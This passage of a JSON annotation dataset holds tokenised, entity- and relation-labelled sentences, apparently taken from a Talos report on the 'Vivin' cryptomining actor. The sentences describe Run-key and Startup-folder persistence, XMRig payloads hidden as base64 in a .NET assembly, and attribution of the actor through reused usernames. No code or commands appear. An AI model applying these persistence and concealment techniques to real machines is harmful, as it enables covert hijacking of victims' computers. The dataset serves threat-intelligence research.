"sent_id": 2, "global_pos": [48, 48], "name": "HKCU : \\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "pos": [10, 13], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [57, 57], "name": "samples", "pos": [2, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "execution chains", "pos": [4, 6], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "XMRig", "pos": [13, 14], "index": "9_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [95, 95], "name": "PowerShell", "pos": [11, 12], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [100, 100], "name": "XMRig payloads", "pos": [16, 18], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [107, 107], "name": ". NET", "pos": [23, 25], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [131, 131], "name": "MSBuild.exe.", "pos": [16, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [147, 147], "name": "XMRig", "pos": [14, 15], "index": "14_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [151, 151], "name": "cmd.exe", "pos": [18, 19], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [187, 187], "name": "XMRig payloads", "pos": [3, 5], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [192, 192], "name": "JSON configuration", "pos": [8, 10], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "WR", "evidence": [3, 4], "t": 7, "h": 10}, {"r": "WR", "evidence": [3, 4], "t": 8, "h": 10}, {"r": "WR", "evidence": [3, 4], "t": 9, "h": 10}, {"r": "FR", "evidence": [4], "h": 10, "t": 11}, {"r": "IJ", "evidence": [4], "h": 11, "t": 12}, {"r": "FR", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "CO", "evidence": [4, 5, 6], "h": 10, "t": 15}, {"r": "WR", "evidence": [5, 6], "h": 13, "t": 14}, {"r": "FR", "evidence": [6, 7], "h": 15, "t": 16}, {"r": "EX", "evidence": [6, 7], "t": 14, "h": 16}, {"r": "RD", "evidence": [7], "h": 16, "t": 17}]}, {"title": "647-25", "sents": [["One", "startup", "item", "was", "created", "by", "writing", "dllm.vbs", "and", "setup.js", "to", "\\Windows\\Start", "Menu\\Programs\\Startup", "."], ["The", "other", "was", "established", "by", "adding", "dllm.vbs", "to", "the", "``", "HKCU", ":", "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "''", "registry", "key", "."], ["While", "all", "samples", "and", "execution", "chains", "Talos", "found", "associated", "with", "this", "actor", "dropped", "XMRig", "as", "their", "final", "payload", ",", "there", "were", "additional", "variations", "observed", "in", "some", "of", "them", "."], ["Some", "samples", "simply", "contained", "only", "one", "referenced", "PE", "file", "at", "the", "PowerShell", "stage", "and", "hid", "their", "XMRig", "payloads", "inside", "of", "the", "reflectively", "loaded", ".", "NET", "assembly", "as", "base-64", "encoded", "strings", "."], ["One", "of", "the", "more", "interesting", "samples", "first", "checked", "to", "see", "if", "it", "had", "access", "to", "``", "MSBuild.exe.", "``"], ["However", ",", "the", "sample", "that", "contained", "this", "check", "still", "only", "attempts", "to", "run", "the", "XMRig", "launch", "command", "to", "cmd.exe", ",", "rather", "than", "attempting", "to", "compile", "the", "next", "stage", "on", "the", "host", "or", "use", "the", "inline", "task", "function", "execution", "as", "other", "malware", "has", "been", "observed", "doing", "when", "attempting", "to", "access", "MSBuild", "."], ["Finally", ",", "some", "XMRig", "payloads", "used", "a", "dropped", "JSON", "configuration", "file", "rather", "than", "specifying", "them", "on", "the", "command-line", "or", "packing", "them", "into", "the", "final", "XMRig", "binary", "."], ["Upon", "too", "much", "exposure", ",", "Vivin", "rotates", "the", "wallet", "address", "used", "along", "with", "potentially", "updating", "their", "infrastructure", "used", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "startup item", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "dllm.vbs", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "setup.js", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "dllm.vbs", "pos": [6, 7], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [24, 24], "name": "HKCU : \\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "pos": [10, 13], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [33, 33], "name": "samples", "pos": [2, 3], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [35, 35], "name": "execution chains", "pos": [4, 6], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "XMRig", "pos": [13, 14], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [71, 71], "name": "PowerShell", "pos": [11, 12], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "XMRig payloads", "pos": [16, 18], "index": "9_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [83, 83], "name": ". NET", "pos": [23, 25], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [107, 107], "name": "MSBuild.exe.", "pos": [16, 17], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [123, 123], "name": "XMRig", "pos": [14, 15], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [127, 127], "name": "cmd.exe", "pos": [18, 19], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [163, 163], "name": "XMRig payloads", "pos": [3, 5], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [168, 168], "name": "JSON configuration", "pos": [8, 10], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [192, 192], "name": "Vivin", "pos": [5, 6], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [195, 195], "name": "wallet address", "pos": [8, 10], "index": "17_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "WR", "evidence": [2, 3], "t": 5, "h": 8}, {"r": "WR", "evidence": [2, 3], "t": 6, "h": 8}, {"r": "WR", "evidence": [2, 3], "t": 7, "h": 8}, {"r": "FR", "evidence": [3], "h": 8, "t": 9}, {"r": "IJ", "evidence": [3], "h": 9, "t": 10}, {"r": "FR", "evidence": [3, 4], "h": 9, "t": 11}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 13}, {"r": "WR", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "FR", "evidence": [5, 6], "h": 13, "t": 14}, {"r": "EX", "evidence": [5, 6], "t": 12, "h": 14}, {"r": "RD", "evidence": [6], "h": 14, "t": 15}, {"r": "WR", "evidence": [6, 7], "h": 14, "t": 16}, {"r": "ST", "evidence": [6, 7], "h": 14, "t": 17}, {"r": "RF", "evidence": [6, 7], "h": 14, "t": 17}]}, {"title": "647-26", "sents": [["The", "other", "was", "established", "by", "adding", "dllm.vbs", "to", "the", "``", "HKCU", ":", "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "''", "registry", "key", "."], ["While", "all", "samples", "and", "execution", "chains", "Talos", "found", "associated", "with", "this", "actor", "dropped", "XMRig", "as", "their", "final", "payload", ",", "there", "were", "additional", "variations", "observed", "in", "some", "of", "them", "."], ["Some", "samples", "simply", "contained", "only", "one", "referenced", "PE", "file", "at", "the", "PowerShell", "stage", "and", "hid", "their", "XMRig", "payloads", "inside", "of", "the", "reflectively", "loaded", ".", "NET", "assembly", "as", "base-64", "encoded", "strings", "."], ["One", "of", "the", "more", "interesting", "samples", "first", "checked", "to", "see", "if", "it", "had", "access", "to", "``", "MSBuild.exe.", "``"], ["However", ",", "the", "sample", "that", "contained", "this", "check", "still", "only", "attempts", "to", "run", "the", "XMRig", "launch", "command", "to", "cmd.exe", ",", "rather", "than", "attempting", "to", "compile", "the", "next", "stage", "on", "the", "host", "or", "use", "the", "inline", "task", "function", "execution", "as", "other", "malware", "has", "been", "observed", "doing", "when", "attempting", "to", "access", "MSBuild", "."], ["Finally", ",", "some", "XMRig", "payloads", "used", "a", "dropped", "JSON", "configuration", "file", "rather", "than", "specifying", "them", "on", "the", "command-line", "or", "packing", "them", "into", "the", "final", "XMRig", "binary", "."], ["Upon", "too", "much", "exposure", ",", "Vivin", "rotates", "the", "wallet", "address", "used", "along", "with", "potentially", "updating", "their", "infrastructure", "used", "."], ["The", "actor", "also", "reuses", "the", "same", "or", "slight", "variations", "of", "the", "same", "username", "for", "a", "number", "of", "online", "accounts", ",", "including", "services", "used", "in", "the", "execution", "chains", "of", "the", "cryptomining", "malware", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "dllm.vbs", "pos": [6, 7], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [10, 10], "name": "HKCU : \\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "pos": [10, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "samples", "pos": [2, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "execution chains", "pos": [4, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "XMRig", "pos": [13, 14], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [57, 57], "name": "PowerShell", "pos": [11, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [62, 62], "name": "XMRig payloads", "pos": [16, 18], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [69, 69], "name": ". NET", "pos": [23, 25], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [93, 93], "name": "MSBuild.exe.", "pos": [16, 17], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [109, 109], "name": "XMRig", "pos": [14, 15], "index": "9_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [113, 113], "name": "cmd.exe", "pos": [18, 19], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [149, 149], "name": "XMRig payloads", "pos": [3, 5], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [154, 154], "name": "JSON configuration", "pos": [8, 10], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [178, 178], "name": "Vivin", "pos": [5, 6], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [181, 181], "name": "wallet address", "pos": [8, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [193, 193], "name": "actor", "pos": [1, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [222, 222], "name": "malware", "pos": [30, 31], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [1, 2], "t": 2, "h": 5}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 5}, {"r": "WR", "evidence": [1, 2], "t": 4, "h": 5}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "IJ", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 5, "t": 10}, {"r": "WR", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "FR", "evidence": [4, 5], "h": 10, "t": 11}, {"r": "EX", "evidence": [4, 5], "t": 9, "h": 11}, {"r": "RD", "evidence": [5], "h": 11, "t": 12}, {"r": "WR", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "ST", "evidence": [5, 6], "h": 11, "t": 14}, {"r": "RF", "evidence": [5, 6], "h": 11, "t": 14}, {"r": "WR", "evidence": [6, 7], "t": 13, "h": 15}, {"r": "ST", "evidence": [6, 7], "t": 14, "h": 15}, {"r": "RF", "evidence": [6, 7], "t": 14, "h": 15}, {"r": "ST", "evidence": [6, 7], "t": 14, "h": 15}, {"r": "RF", "evidence": [6, 7], "t": 14, "h": 15}, {"r": "WR", "evidence": [7], "h": 15, "t": 16}, {"r": "WR", "evidence": [7], "h": 15, "t": 16}]}, {"title": "647-27", "sents": [["While", "all", "samples", "and", "execution", "chains", "Talos", "found", "associated", "with", "this", "actor", "dropped", "XMRig", "as", "their", "final", "payload", ",", "there", "were", "additional", "variations", "observed", "in", "some", "of", "them", "."], ["Some", "samples", "simply", "contained", "only", "one", "referenced", "PE", "file", "at", "the", "PowerShell", "stage", "and", "hid", "their", "XMRig", "payloads", "inside", "of", "the", "reflectively", "loaded", ".", "NET", "assembly", "as", "base-64", "encoded", "strings", "."], ["One", "of", "the", "more", "interesting", "samples", "first", "checked", "to", "see", "if", "it", "had", "access", "to", "``", "MSBuild.exe.", "``"], ["However", ",", "the", "sample", "that", "contained", "this", "check", "still", "only", "attempts", "to", "run", "the", "XMRig", "launch", "command", "to", "cmd.exe", ",", "rather", "than", "attempting", "to", "compile", "the", "next", "stage", "on", "the", "host", "or", "use", "the", "inline", "task", "function", "execution", "as", "other", "malware", "has", "been", "observed", "doing", "when", "attempting", "to", "access", "MSBuild", "."], ["Finally", ",", "some", "XMRig", "payloads", "used", "a", "dropped", "JSON", "configuration", "file", "rather", "than", "specifying", "them", "on", "the", "command-line", "or", "packing", "them", "into", "the", "final", "XMRig", "binary", "."], ["Upon", "too", "much", "exposure", ",", "Vivin", "rotates", "the", "wallet", "address", "used", "along", "with", "potentially", "updating", "their", "infrastructure", "used", "."], ["The", "actor", "also", "reuses", "the", "same", "or", "slight", "variations", "of", "the", "same", "username", "for", "a", "number", "of", "online", "accounts", ",", "including", "services", "used", "in", "the", "execution", "chains", "of", "the", "cryptomining", "malware", "."], ["We", "located", "the", "first", "username", "Talos", "linked", "to", "the", "actor", "through", "a", "Reddit", "post", "claiming", "the", "same", "Monero", "wallet", "address", "found", "hardcoded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "as", "their", "own", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "samples", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "execution chains", "pos": [4, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "XMRig", "pos": [13, 14], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [40, 40], "name": "PowerShell", "pos": [11, 12], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "XMRig payloads", "pos": [16, 18], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [52, 52], "name": ". NET", "pos": [23, 25], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [76, 76], "name": "MSBuild.exe.", "pos": [16, 17], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [92, 92], "name": "XMRig", "pos": [14, 15], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [96, 96], "name": "cmd.exe", "pos": [18, 19], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [132, 132], "name": "XMRig payloads", "pos": [3, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [137, 137], "name": "JSON configuration", "pos": [8, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [161, 161], "name": "Vivin", "pos": [5, 6], "index": "11_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [164, 164], "name": "wallet address", "pos": [8, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [176, 176], "name": "actor", "pos": [1, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [205, 205], "name": "malware", "pos": [30, 31], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [216, 216], "name": "actor", "pos": [9, 10], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [234, 234], "name": "XMRig payload", "pos": [27, 29], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "IJ", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 8}, {"r": "WR", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "FR", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "EX", "evidence": [3, 4], "t": 7, "h": 9}, {"r": "RD", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "ST", "evidence": [4, 5], "h": 9, "t": 12}, {"r": "RF", "evidence": [4, 5], "h": 9, "t": 12}, {"r": "WR", "evidence": [5, 6], "t": 11, "h": 13}, {"r": "ST", "evidence": [5, 6], "t": 12, "h": 13}, {"r": "RF", "evidence": [5, 6], "t": 12, "h": 13}, {"r": "ST", "evidence": [5, 6], "t": 12, "h": 13}, {"r": "RF", "evidence": [5, 6], "t": 12, "h": 13}, {"r": "WR", "evidence": [6], "h": 13, "t": 14}, {"r": "WR", "evidence": [6], "h": 13, "t": 14}, {"r": "CO", "evidence": [6, 7], "h": 13, "t": 15}, {"r": "WR", "evidence": [6, 7], "t": 14, "h": 15}, {"r": "WR", "evidence": [6, 7], "t": 14, "h": 15}, {"r": "WR", "evidence": [6, 7], "t": 14, "h": 16}]}, {"title": "647-28", "sents": [["Some", "samples", "simply", "contained", "only", "one", "referenced", "PE", "file", "at", "the", "PowerShell", "stage", "and", "hid", "their", "XMRig", "payloads", "inside", "of", "the", "reflectively", "loaded", ".", "NET", "assembly", "as", "base-64", "encoded", "strings", "."], ["One", "of", "the", "more", "interesting", "samples", "first", "checked", "to", "see", "if", "it", "had", "access", "to", "``", "MSBuild.exe.", "``"], ["However", ",", "the", "sample", "that", "contained", "this", "check", "still", "only", "attempts", "to", "run", "the", "XMRig", "launch", "command", "to", "cmd.exe", ",", "rather", "than", "attempting", "to", "compile", "the", "next", "stage", "on", "the", "host", "or", "use", "the", "inline", "task", "function", "execution", "as", "other", "malware", "has", "been", "observed", "doing", "when", "attempting", "to", "access", "MSBuild", "."], ["Finally", ",", "some", "XMRig", "payloads", "used", "a", "dropped", "JSON", "configuration", "file", "rather", "than", "specifying", "them", "on", "the", "command-line", "or", "packing", "them", "into", "the", "final", "XMRig", "binary", "."], ["Upon", "too", "much", "exposure", ",", "Vivin", "rotates", "the", "wallet", "address", "used", "along", "with", "potentially", "updating", "their", "infrastructure", "used", "."], ["The", "actor", "also", "reuses", "the", "same", "or", "slight", "variations", "of", "the", "same", "username", "for", "a", "number", "of", "online", "accounts", ",", "including", "services", "used", "in", "the", "execution", "chains", "of", "the", "cryptomining", "malware", "."], ["We", "located", "the", "first", "username", "Talos", "linked", "to", "the", "actor", "through", "a", "Reddit", "post", "claiming", "the", "same", "Monero", "wallet", "address", "found", "hardcoded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "as", "their", "own", "."], ["The", "same", "user", "also", "posted", "about", "having", "issues", "with", "their", "account", "for", "the", "``", "minexmr.com", "''", "mining", "pool", ",", "the", "same", "pooling", "address", "used", "in", "the", "configurations", "of", "the", "XMRig", "payloads", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [11, 11], "name": "PowerShell", "pos": [11, 12], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "XMRig payloads", "pos": [16, 18], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [23, 23], "name": ". NET", "pos": [23, 25], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [47, 47], "name": "MSBuild.exe.", "pos": [16, 17], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "XMRig", "pos": [14, 15], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [67, 67], "name": "cmd.exe", "pos": [18, 19], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [103, 103], "name": "XMRig payloads", "pos": [3, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [108, 108], "name": "JSON configuration", "pos": [8, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [132, 132], "name": "Vivin", "pos": [5, 6], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [135, 135], "name": "wallet address", "pos": [8, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [147, 147], "name": "actor", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [176, 176], "name": "malware", "pos": [30, 31], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [187, 187], "name": "actor", "pos": [9, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [205, 205], "name": "XMRig payload", "pos": [27, 29], "index": "13_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [225, 225], "name": "minexmr.com", "pos": [14, 15], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [240, 240], "name": "XMRig payloads", "pos": [29, 31], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "IJ", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "FR", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "EX", "evidence": [2, 3], "t": 4, "h": 6}, {"r": "RD", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "ST", "evidence": [3, 4], "h": 6, "t": 9}, {"r": "RF", "evidence": [3, 4], "h": 6, "t": 9}, {"r": "WR", "evidence": [4, 5], "t": 8, "h": 10}, {"r": "ST", "evidence": [4, 5], "t": 9, "h": 10}, {"r": "RF", "evidence": [4, 5], "t": 9, "h": 10}, {"r": "ST", "evidence": [4, 5], "t": 9, "h": 10}, {"r": "RF", "evidence": [4, 5], "t": 9, "h": 10}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 12}, {"r": "WR", "evidence": [5, 6], "t": 11, "h": 12}, {"r": "WR", "evidence": [5, 6], "t": 11, "h": 12}, {"r": "ST", "evidence": [6, 7], "h": 12, "t": 14}, {"r": "RF", "evidence": [6, 7], "h": 12, "t": 14}, {"r": "WR", "evidence": [5, 6], "t": 11, "h": 13}, {"r": "ST", "evidence": [6, 7], "h": 13, "t": 14}, {"r": "RF", "evidence": [6, 7], "h": 13, "t": 14}, {"r": "ST", "evidence": [6, 7], "h": 13, "t": 14}, {"r": "RF", "evidence": [6, 7], "h": 13, "t": 14}, {"r": "ST", "evidence": [7], "t": 14, "h": 15}, {"r": "RF", "evidence": [7], "t": 14, "h": 15}]}, {"title": "647-29", "sents": [["One", "of", "the", "more", "interesting", "samples", "first", "checked", "to", "see", "if", "it", "had", "access", "to", "``", "MSBuild.exe.", "``"], ["However", ",", "the", "sample", "that", "contained", "this", "check", "still", "only", "attempts", "to", "run", "the", "XMRig", "launch", "command", "to", "cmd.exe", ",", "rather", "than", "attempting", "to", "compile", "the", "next", "stage", "on", "the", "host", "or", "use", "the", "inline", "task", "function", "execution", "as", "other", "malware", "has", "been", "observed", "doing", "when", "attempting", "to", "access", "MSBuild", "."], ["Finally", ",", "some", "XMRig", "payloads", "used", "a", "dropped", "JSON", "configuration", "file", "rather", "than", "specifying", "them", "on", "the", "command-line", "or", "packing", "them", "into", "the", "final", "XMRig", "binary", "."], ["Upon", "too", "much", "exposure", ",", "Vivin", "rotates", "the", "wallet", "address", "used", "along", "with", "potentially", "updating", "their", "infrastructure", "used", "."], ["The", "actor", "also", "reuses", "the", "same", "or", "slight", "variations", "of", "the", "same", "username", "for", "a", "number", "of", "online", "accounts", ",", "including", "services", "used", "in", "the", "execution", "chains", "of", "the", "cryptomining", "malware", "."], ["We", "located", "the", "first", "username", "Talos", "linked", "to", "the", "actor", "through", "a", "Reddit", "post", "claiming", "the", "same", "Monero", "wallet", "address", "found", "hardcoded", "in", "our", "original", "sample", "'s", "XMRig", "payload", "as", "their", "own", "."], ["The", "same", "user", "also", "posted", "about", "having", "issues", "with", "their", "account", "for", "the", "``", "minexmr.com", "''", "mining", "pool", ",", "the", "same", "pooling", "address", "used", "in", "the", "configurations", "of", "the", "XMRig", "payloads", "."], ["A", "GitHub", "account", "also", "uses", "the", "same", "username", "as", "the", "Reddit", "account", "linked", "to", "Vivin", "that", "contains", "a", "forked", "repository", "of", "the", "XMRig", "coinminer", "source", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [16, 16], "name": "MSBuild.exe.", "pos": [16, 17], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "XMRig", "pos": [14, 15], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [36, 36], "name": "cmd.exe", "pos": [18, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [72, 72], "name": "XMRig payloads", "pos": [3, 5], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [77, 77], "name": "JSON configuration", "pos": [8, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [101, 101], "name": "Vivin", "pos": [5, 6], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [104, 104], "name": "wallet address", "pos": [8, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [116, 116], "name": "actor", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [145, 145], "name": "malware", "pos": [30, 31], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [156, 156], "name": "actor", "pos": [9, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [174, 174], "name": "XMRig payload", "pos": [27, 29], "index": "10_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [194, 194], "name": "minexmr.com", "pos": [14, 15], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [209, 209], "name": "XMRig payloads", "pos": [29, 31], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [226, 226], "name": "Vivin", "pos": [14, 15], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "FR", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "EX", "evidence": [1, 2], "t": 1, "h": 3}, {"r": "RD", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "ST", "evidence": [2, 3], "h": 3, "t": 6}, {"r": "RF", "evidence": [2, 3], "h": 3, "t": 6}, {"r": "WR", "evidence": [3, 4], "t": 5, "h": 7}, {"r": "ST", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "RF", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "ST", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "RF", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 9}, {"r": "WR", "evidence": [4, 5], "t": 8, "h": 9}, {"r": "WR", "evidence": [4, 5], "t": 8, "h": 9}, {"r": "ST", "evidence": [5, 6], "h": 9, "t": 11}, {"r": "RF", "evidence": [5, 6], "h": 9, "t": 11}, {"r": "WR", "evidence": [4, 5], "t": 8, "h": 10}, {"r": "ST", "evidence": [5, 6], "h": 10, "t": 11}, {"r": "RF", "evidence": [5, 6], "h": 10, "t": 11}, {"r": "ST", "evidence": [5, 6], "h": 10, "t": 11}, {"r": "RF", "evidence": [5, 6], "h": 10, "t": 11}, {"r": "ST", "evidence": [6], "t": 11, "h": 12}, {"r": "RF", "evidence": [6], "t": 11, "h": 12}, {"r": "WR", "evidence": [6, 7], "h": 12, "t": 13}]}, {"title": "647-30", "sents": [["However", ",", "the", "sample", "that", "contained", "this", "check", "still", "only", "attempts", "to", "run", "the", "XMRig", "launch", "command", "to", "cmd.exe", ",", "rather", "than", "attempting", "to", "compile", "the", "next", "stage", "on", "the", "host", "or", "use", "the", "inline", "task", "function", "execution", "as", "other", "malware", "has", "been", "observed", "doing", "when", "attempting", "to", "access", "MSBuild", "."], ["Finally", ",", "some", "XMRig", "payloads", "used", "a", "dropped", "JSON", "configuration", "file", "rather", "than", "specifying", "them", "on", "the", "command-line", "or", "packing", "them", "into", "the", "final", "XMRig", "binary", "."], ["Upon", "too", "much", "exposure", ",", "Vivin", "rotates", "the", "wallet", "address", "used", "along", "with", "potentially", "updating", "their", "infrastructure", "used", "."], ["The", "actor", "also", "reuses", "the", "same", "or", "slight", "variations", "of", "the", "same", "username", "for", "a", "number", "of", "online", "accounts", ",", "including", "services", "used", "in", "the", "execution", "chains", "of", "the", "cryptomining", "malware", "."], ["We", "located", "the", "first", "username", "Talos", "linked", "to", "the", "actor", "through", "a", 